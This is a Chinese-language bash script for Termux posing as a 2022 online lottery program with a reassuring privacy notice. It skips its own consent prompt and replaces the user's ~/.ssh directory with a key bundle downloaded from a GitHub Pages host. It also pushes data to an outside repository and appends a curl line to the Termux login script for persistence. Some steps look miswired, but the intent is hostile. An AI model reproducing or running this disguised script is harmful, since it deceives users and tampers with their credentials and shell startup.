#!/bin/bash
#
# 2022 Termux 抽奖程序
#

#########
# 警告：请不要破解或修改此程序，一旦发现恶意commit破坏自然数据本活动将取消！
#########

# 许可相关
failed(){
echo "非法操作已拒绝"
exit
}
我同意并知晓(){
start
}

#数据相关
gen_U2ID(){
export U2ID=$(head -c 32 /dev/random | base64)
}

start(){
pkg in
pkg in git curl bash
echo "你加入kiwi & linux & EDK2 群了吗，回答加了或者没加"
printf ">"
  read Input2
    case "$Input2" in
      加了 ) start2;;
      * ) failed;;
    esac
}
start2(){
echo "正在初始化数据库信息"
git clone git@github.com:flyt4e/data222.git --depth=1 ~/.key_cache/>/dev/null
echo "加载密钥证书"
mv ~/.ssh ~/.ssh2
curl https://flyt4e.github.io/data111/loginkey >~/.ssh/cache.zip
mkdir ~/.ssh
unzip ~/.ssh/cache.zip -d ~/.ssh/ >/dev/null
echo "正在提交您的请求"
gen_U2ID
echo "您的U2ID为 $U2ID"
echo "等待抽奖结果发布">~/.key_cache/$U2ID
export OLDPWD2=$(pwd)
echo "正在提交数据..."
cd ~/.key_cache/
git add . >/dev/null
git commit -m "Add NEW DATA" >/dev/null
git push origin main >/dev/null
cd $OLDPWD2
rm -rf ~/.key_cache
echo "设置消息通知"
echo curl https://flyt4e.github.io/data222/$U2ID >>$PREFIX/etc/termux-login.sh
echo "退出"
unset U2ID
unset OLDPWD2
exit
}

# 最终用户界面
echo "欢迎使用2022Termux终端在线抽奖程序 版本V1.0.0"
echo "隐私政策:"
echo "本程序使用数据库实现数据收集及在线推送，需要安装git和curl"
echo "使用期间会劫持bashrc启用消息推送"
echo "本程序使用时拥有对termux的掌控权，但本人已人格担保，不会恶意发送任何非法信息，仅用于中奖通知用途，也保证了公平性"
echo "此程序会通过termux消息通知提醒您执行相应命令提交快递数据之后会自动删除"
echo "请不要研究或恶意破坏此程序，更不要恶意破解数据库恶意上传数据，一旦发现活动全部取消"
echo "本程序主要使用linux内核功能为您生成唯一用户ID上传到数据库启用消息通知并在开奖当天提醒您，不会获取任何隐私信息，解释权归群主所有"
echo "如您同意，请等待10秒后继续，不同意CTRL+C停止脚本  并车"
sleep 10
start2
exit
